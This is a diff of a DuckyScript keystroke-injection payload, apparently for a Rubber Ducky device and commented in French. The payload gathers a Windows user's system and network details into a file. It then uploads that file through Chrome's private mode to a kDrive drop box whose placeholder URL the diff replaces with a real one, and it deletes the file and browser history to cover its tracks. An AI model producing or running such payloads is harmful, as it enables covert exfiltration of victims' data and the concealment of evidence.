@@ -1,23 +1,33 @@
-REM ####################################################################################
-REM #                                                                                  |
-REM # Title        : Information gathering and export                                  |
-REM # Author       : Miiraak                                                           |
-REM # Version      : 3.0                                                               |
-REM # Category     : Execute                                                           |
-REM # Target       : Windows                                                           |
-REM #                                                                                  |
-REM ####################################################################################
-REM
+REM ########################################################################################
+REM |                                                                                      |
+REM |                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
+REM |                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
+REM |                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
+REM |                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
+REM |                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                |
+REM |                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
+REM |                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
+REM |                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
+REM |                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |
+REM |                                                                                      |
+REM | Title        : Information gathering and export                                      |
+REM | Author       : Miiraak                                                               |
+REM | Version      : v3.0                                                                  |
+REM | Category     : Execute & Data gathering                                              |
+REM | Target       : Windows                                                               |
+REM |                                                                                      |
+REM ########################################################################################
+
 REM Requirements:
 REM     - Chrome
-REM     - kDrive avec une boite de depos. (!!! Remplacez la ligne 49 !!!)
-REM
+REM     - kDrive avec une boite de depos. (!!! Remplacez la ligne 61 !!!)
+
 REM Description:
 REM     - Recupere les information et les stocks dans un fichier .txt dans le dossier root
 REM     - Ouvre Chrome en navigation privee
 REM     - Exporte le fichier crée sur une boite de depos Infomaniak.
 REM     - Supprime l'historique et le fichier cree.
-REM
+
 REM ________Gather information________ 
 DEFAULT_DELAY 500
 GUI r
@@ -43,11 +53,12 @@ STRINGLN Get-NetTCPConnection | Where-Object -Property State -Match Listen >> ga
 STRINGLN Get-NetTCPConnection | Select-Object -Property * >> gathered_data_from_$env:USERNAME.txt;
 STRINGLN exit
 DEFAULT_DELAY 500
+
 REM ________Export information________
 GUI r
 STRINGLN chrome.exe
 CTRL-SHIFT n
-STRINGLN https://kdrive.infomaniak.com/app/collaborate/XXXXXX/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
+STRINGLN https://kdrive.infomaniak.com/app/collaborate/816950/ed983d9b-79b2-4a76-a782-b15576dd5b3a
 DELAY 3000
 DEFAULT_DELAY 100
 TAB
@@ -83,7 +94,7 @@ ENTER
 DELAY 2000
 CTRL w
 CTRL w
-REM
+
 REM ________RemoveFile & History cleaning________
 GUI r 
 STRING cmd.exe
